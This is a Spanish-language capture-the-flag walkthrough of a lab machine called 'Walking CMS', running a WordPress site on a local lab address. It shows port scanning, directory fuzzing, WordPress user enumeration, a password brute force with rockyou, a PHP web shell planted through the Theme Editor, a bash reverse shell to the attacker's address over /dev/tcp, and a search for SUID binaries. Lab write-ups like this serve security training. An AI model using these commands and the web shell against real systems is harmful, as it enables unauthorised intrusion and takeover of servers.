# MÁQUINA WALKING CMS

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto.jpg)

El único puerto que se encuentra abierto es el 80. así que vamos a ver el contenido de la página web:

![WEB](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto2.jpg)

Es la página por defecto de Apache por lo que no hay mucha información, además en el código fuente tampoco encontramos nada.

El siguiente paso será hacer fuzzing web para encontrar ficheros o directorios que haya dentro de la máquina:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![FUZZ](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto3.jpg)

Hay un /wordpress que puede ser interesante, vamos a ver que hay:

![WP](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto4.jpg)

Vamos a volver a hacer fuzzing ya que ahora encontraremos cosas diferentes:

```shell
gobuster dir -u http://172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![FUZZ2](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto5.jpg)

Encontramos lo típico de un wordpress, lo que más no puede interesar será el wp-login.php ya que será el lugar donde podremos acceder al panel.

Vamos a utilizar la herramienta wpscan para ver si podemos encontrar un usuario:

```shell
wpscan --url http://172.17.0.2/wordpress --enumerate u
```

![USR](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto6.jpg)

Hemos encontrado un usuario mario, ahora podemos ejecutar un ataque de fuerza bruta para conseguir su contraseña:

```shell
sudo wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```

![LOVE](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto7.jpg)

Ya hemos encontrado la contraseña, vamos a acceder al panel entonces:

Vemos que tiene el plugin de Theme Editor instalado y activo, una vez que entramos dentro vemos lo siguiente:

![ED](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto8.jpg)

Vamos a intentar habilitar la ejecución de comandos de forma remota para la página index.php del tema con un simple código de php:

```shell
<?php
	system($_GET['cmd']);
?>
```

![PHP](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto9.jpg)

Si ahora nos dirigimos a la URL donde se encuentra el index.php e intentamos ejecutar comandos de forma remota vemos que funciona:

```shell
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=id
```

![ID](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto10.jpg)

Vamos a obtener acceso a la máquina gracias a una reverse shell:

```shell
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

![SHELL](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto11.jpg)

¿Habrá algún binario con permisos especiales? Veamoslo:

```shell
find / -perm -4000 2>/dev/null
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Walking%20CMS/foto12.jpg)

Y ya somos root!






